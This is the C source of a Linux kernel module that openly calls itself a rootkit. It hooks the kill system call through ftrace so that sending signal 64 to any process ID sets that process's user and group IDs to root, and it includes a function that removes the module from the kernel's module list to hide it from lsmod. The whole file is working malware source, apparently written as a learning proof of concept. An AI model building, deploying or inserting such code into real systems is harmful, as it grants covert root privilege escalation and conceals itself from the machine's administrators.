#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abolfazl Kazmei");
MODULE_DESCRIPTION("Giving root privileges to a process and hiding the module!");
MODULE_VERSION("0.01");


struct task_struct *get_task_struct_by_pid(unsigned pid) {
    struct pid *proc_pid = find_vpid(pid);
    struct task_struct *task;

    if(!proc_pid)
        return 0;
    
    task = pid_task(proc_pid, PIDTYPE_PID);
    return task;
}

static int make_pid_root(unsigned pid) {
    struct task_struct *task;
    struct cred *new_cred;

    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    task = get_task_struct_by_pid(pid);
    if (task == NULL) {
      printk("Failed to get current task info.\n");
      return -1;
    }

    new_cred = prepare_creds();
    if (new_cred == NULL) {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }
    new_cred->uid = kuid;
    new_cred->gid = kgid;
    new_cred->euid = kuid;
    new_cred->egid = kgid;

    rcu_assign_pointer(task->cred, new_cred);

    printk("PID %d is now root!\n", pid);
    return 0;
}

static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs) {
    pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 64 ) {
        printk(KERN_INFO "rootkit: giving root to: %d\n", pid);
        make_pid_root(pid);
        return 0;
    }

    return orig_kill(regs);

}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};


void hideme(void) {
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    pr_info("rootkit: We are now hidden, test by running lsmod!:-D\n");
}

static int __init rootkit_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");
    //hideme();

    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);


